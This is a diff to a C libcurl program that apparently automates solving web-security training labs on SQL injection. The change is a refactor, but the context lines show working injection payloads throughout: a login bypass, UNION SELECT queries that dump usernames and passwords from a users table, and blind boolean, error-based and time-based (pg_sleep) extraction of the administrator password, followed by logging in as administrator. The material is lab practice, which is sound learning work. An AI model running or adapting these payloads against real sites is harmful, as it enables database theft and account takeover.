@@ -66,7 +66,8 @@ int extract_lab_id(const char *html_content) {
     return -1;
 }
 
-int performCurlRequest(CURL *curl) {
+int performCurlRequest(CURL *curl, char* response_buffer) {
+
     CURLcode res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
         fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
@@ -187,9 +188,8 @@ int detect_column_count(char *url, char *response_buffer, CURL *curl, char* comm
         strncpy(temp_url, url, strlen(url));
         snprintf(url, 300,"%s/filter?category=Accessories'+order+by+%d%s", temp_url, i, comment_sign);
         curl_easy_setopt(curl, CURLOPT_URL, url);
-        memset(response_buffer, 0, strlen(response_buffer));
 
-        if (performCurlRequest(curl) != 0)
+        if (performCurlRequest(curl, response_buffer) != 0)
             return -1;
         i++;
         clear_url(url);
@@ -215,7 +215,7 @@ int vulnerabilities(char *url) {
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_buffer);
 
-        if (performCurlRequest(curl) != 0)
+        if (performCurlRequest(curl, response_buffer) != 0)
             goto quit;
 
         int selected_lab = -1;
@@ -225,9 +225,7 @@ int vulnerabilities(char *url) {
             strncat(url, "/filter?category=Accessories'+or+1+=1--", 39);
             curl_easy_setopt(curl, CURLOPT_URL, url);
 
-            memset(response_buffer, 0, strlen(response_buffer));
-
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
         }
 
@@ -236,8 +234,7 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
 
-            memset(response_buffer, 0, strlen(response_buffer));
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -246,15 +243,13 @@ int vulnerabilities(char *url) {
             snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator'--&password=password", csrf_token);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
 
-            memset(response_buffer, 0, strlen(response_buffer));
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             clear_url(url);
             curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
         }
 
@@ -279,9 +274,8 @@ int vulnerabilities(char *url) {
             strncat(url, sqli_payload, strlen(sqli_payload));
 
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
             clear_url(url);
 
@@ -299,9 +293,8 @@ int vulnerabilities(char *url) {
             strncat(url, sqli_payload_2, strlen(sqli_payload_2));
 
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
         }
         else if (selected_lab == 4) {
@@ -323,9 +316,8 @@ int vulnerabilities(char *url) {
             strncat(url, sqli_payload, strlen(sqli_payload));
 
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
             clear_url(url);
 
@@ -344,9 +336,8 @@ int vulnerabilities(char *url) {
             strncat(url, sqli_payload_2, strlen(sqli_payload_2));
 
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
         }
 
@@ -370,9 +361,8 @@ int vulnerabilities(char *url) {
             strncat(url, sqli_payload, strlen(sqli_payload));
 
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
             clear_url(url);
 
@@ -395,9 +385,8 @@ int vulnerabilities(char *url) {
             strncat(url, sqli_payload2, strlen(sqli_payload2));
 
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
             clear_url(url);
 
@@ -424,9 +413,8 @@ int vulnerabilities(char *url) {
             strncat(url, sqli_payload3, strlen(sqli_payload3));
 
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
             clear_url(url);
 
@@ -439,9 +427,8 @@ int vulnerabilities(char *url) {
             strncat(url, "/login", 6);
             curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -449,9 +436,8 @@ int vulnerabilities(char *url) {
             char post_data[512] = "";
             snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
         }
 
@@ -475,9 +461,8 @@ int vulnerabilities(char *url) {
             strncat(url, sqli_payload, strlen(sqli_payload));
 
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
             clear_url(url);
 
@@ -500,9 +485,8 @@ int vulnerabilities(char *url) {
             strncat(url, sqli_payload2, strlen(sqli_payload2));
 
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
             clear_url(url);
 
@@ -528,9 +512,8 @@ int vulnerabilities(char *url) {
             strncat(url, sqli_payload3, strlen(sqli_payload3));
 
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
             clear_url(url);
 
@@ -543,9 +526,8 @@ int vulnerabilities(char *url) {
             strncat(url, "/login", 6);
             curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -553,9 +535,8 @@ int vulnerabilities(char *url) {
             char post_data[512] = "";
             snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
         }
 
@@ -571,9 +552,8 @@ int vulnerabilities(char *url) {
                 strncat(url, "/filter?category=Accessories", 28);
                 strncat(url, sqli_payload_end, strlen(sqli_payload_end));
                 curl_easy_setopt(curl, CURLOPT_URL, url);
-                memset(response_buffer, 0, strlen(response_buffer));
 
-                if (performCurlRequest(curl) != 0)
+                if (performCurlRequest(curl, response_buffer) != 0)
                     goto quit;
 
                 if (strstr(response_buffer, "Internal Server Error") == NULL)
@@ -618,10 +598,8 @@ int vulnerabilities(char *url) {
                 strncat(sqli_payload, sqli_payload_end, strlen(sqli_payload_end));
                 strncat(url, sqli_payload, strlen(sqli_payload));
                 curl_easy_setopt(curl, CURLOPT_URL, url);
-                memset(response_buffer, 0, strlen(response_buffer));
 
-
-                if (performCurlRequest(curl) != 0)
+                if (performCurlRequest(curl, response_buffer) != 0)
                     goto quit;
                 clear_url(url);
                 strncat(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL", 47);
@@ -633,17 +611,15 @@ int vulnerabilities(char *url) {
         else if (selected_lab == 9) {
             strncat(url, "/filter?category=Accessories'+UNION+SELECT+'abc','def'--", 56);
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             clear_url(url);
             strncat(url, "/filter?category=Accessories'+UNION+SELECT+username,+password+FROM+users--", 74);
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-             if (performCurlRequest(curl) != 0)
+             if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             // extract administrator's password from column
@@ -655,9 +631,8 @@ int vulnerabilities(char *url) {
             strncat(url, "/login", 6);
             curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -665,26 +640,23 @@ int vulnerabilities(char *url) {
             char post_data[512] = "";
             snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
         }
 
         else if (selected_lab == 10) {
             strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,'abc'--", 55);
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             clear_url(url);
             strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,username||'~'||password+FROM+users--", 84);
             curl_easy_setopt(curl, CURLOPT_URL, url);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             // extract administrator's password from column
@@ -696,18 +668,16 @@ int vulnerabilities(char *url) {
             strncat(url, "/login", 6);
             curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             extract_csrf_token(response_buffer, csrf_token, 64);
             char post_data[512] = "";
             snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
         }
 
@@ -719,9 +689,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, HeaderCallback);
             curl_easy_setopt(curl, CURLOPT_HEADERDATA, header);
             curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0) {
+            if (performCurlRequest(curl, response_buffer) != 0) {
                 goto quit;
                 free(header);
             }
@@ -756,9 +725,8 @@ int vulnerabilities(char *url) {
                     snprintf(sqli_payload, 150, "TrackingId=%s' AND (SELECT SUBSTRING(password,%d,1) FROM users WHERE username='administrator')='%c", tracking_id_cookie, l, character+i);
                     }
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
-                    memset(response_buffer, 0, strlen(response_buffer));
 
-                    if (performCurlRequest(curl) != 0) {
+                    if (performCurlRequest(curl, response_buffer) != 0) {
                         goto quit;
                         free(header);
                     }
@@ -784,9 +752,8 @@ int vulnerabilities(char *url) {
             strncat(url, "/login", 6);
             curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0) {
+            if (performCurlRequest(curl, response_buffer) != 0) {
                 goto quit;
                 free(header);
             }
@@ -796,9 +763,8 @@ int vulnerabilities(char *url) {
             char post_data[512] = "";
             snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, password);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0) {
+            if (performCurlRequest(curl, response_buffer) != 0) {
                 goto quit;
                 free(header);
             }
@@ -813,9 +779,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, HeaderCallback);
             curl_easy_setopt(curl, CURLOPT_HEADERDATA, header);
             curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0) {
+            if (performCurlRequest(curl, response_buffer) != 0) {
                 goto quit;
                 free(header);
             }
@@ -849,9 +814,8 @@ int vulnerabilities(char *url) {
                     int asciiValue = (int)alphabetAndNumbers[mid];
                     snprintf(sqli_payload, 250, "TrackingId=%s'||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))=%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",tracking_id_cookie, l, asciiValue);
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
-                    memset(response_buffer, 0, strlen(response_buffer));
 
-                    if (performCurlRequest(curl) != 0) {
+                    if (performCurlRequest(curl, response_buffer) != 0) {
                         goto quit;
                         free(header);
                     }
@@ -863,9 +827,8 @@ int vulnerabilities(char *url) {
 
                     snprintf(sqli_payload, 250, "TrackingId=%s'||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))<%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",tracking_id_cookie, l, alphabetAndNumbers[mid]);
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
-                    memset(response_buffer, 0, strlen(response_buffer));
 
-                    if (performCurlRequest(curl) != 0) {
+                    if (performCurlRequest(curl, response_buffer) != 0) {
                         goto quit;
                         free(header);
                     }
@@ -885,9 +848,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_COOKIE, NULL);
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0) {
+            if (performCurlRequest(curl, response_buffer) != 0) {
                 goto quit;
                 free(header);
             }
@@ -897,9 +859,8 @@ int vulnerabilities(char *url) {
             char post_data[512] = "";
             snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, password);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0) {
+            if (performCurlRequest(curl, response_buffer) != 0) {
                 goto quit;
                 free(header);
             }
@@ -909,7 +870,7 @@ int vulnerabilities(char *url) {
         else if (selected_lab == 13) {
             curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--");
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             char admin_account_password[30] = "";
@@ -921,9 +882,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_COOKIE, NULL);
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -931,16 +891,15 @@ int vulnerabilities(char *url) {
             char post_data[512] = "";
             snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, admin_account_password);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
         }
 
         else if (selected_lab == 14) {
             curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=paas'||pg_sleep(10)--");
 
-            if (performCurlRequest(curl) != 0)
+            if (performCurlRequest(curl, response_buffer) != 0)
                 goto quit;
         }
 
@@ -952,9 +911,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, HeaderCallback);
             curl_easy_setopt(curl, CURLOPT_HEADERDATA, header);
             curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
-            memset(response_buffer, 0, strlen(response_buffer));
 
-             if (performCurlRequest(curl) != 0) {
+             if (performCurlRequest(curl, response_buffer) != 0) {
                 goto quit;
                 free(header);
             }
@@ -987,9 +945,8 @@ int vulnerabilities(char *url) {
                     asciiValue = (int)alphabetAndNumbers[i];
                     snprintf(sqli_payload, 200, "TrackingId=%s'%%3BSELECT+CASE+WHEN+(username='administrator'+AND+ASCII(SUBSTRING(password,%d,1))='%d')+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--",tracking_id_cookie, l, asciiValue);
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
-                    memset(response_buffer, 0, strlen(response_buffer));
 
-                    if (performCurlRequest(curl) != 0) {
+                    if (performCurlRequest(curl, response_buffer) != 0) {
                         goto quit;
                         free(header);
                     }
@@ -1010,9 +967,8 @@ int vulnerabilities(char *url) {
             strncat(url, "/login", 6);
             curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
-            memset(response_buffer, 0, strlen(response_buffer));
 
-            if (performCurlRequest(curl) != 0) {
+            if (performCurlRequest(curl, response_buffer) != 0) {
                 goto quit;
                 free(header);
             }
@@ -1022,10 +978,9 @@ int vulnerabilities(char *url) {
             char post_data[512] = "";
             snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, password);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-            memset(response_buffer, 0, strlen(response_buffer));
 
             sleep(2);
-            if (performCurlRequest(curl) != 0) {
+            if (performCurlRequest(curl, response_buffer) != 0) {
                 goto quit;
                 free(header);
             }
@@ -1042,21 +997,19 @@ int vulnerabilities(char *url) {
     }
 
     quit:
-        memset(response_buffer, 0, strlen(response_buffer));
+    
     clear_url(url);
         curl_easy_setopt(curl, CURLOPT_URL, url);
         curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
-        memset(response_buffer, 0, strlen(response_buffer));
-        if (performCurlRequest(curl) != 0)
-            goto quit;
 
-        memset(response_buffer, 0, strlen(response_buffer));
-        if (performCurlRequest(curl) != 0)
-            goto quit;
+        if (performCurlRequest(curl, response_buffer) != 0)
+            return_value = -1;
 
-        if (strstr(response_buffer, "Congratulations, you solved the lab!") != NULL) {
+        if (performCurlRequest(curl, response_buffer) != 0)
+            return_value = -1;
+
+        if (strstr(response_buffer, "Congratulations, you solved the lab!") != NULL)
             return_value = 0;
-        }
 
         free(url);
         free(response_buffer);
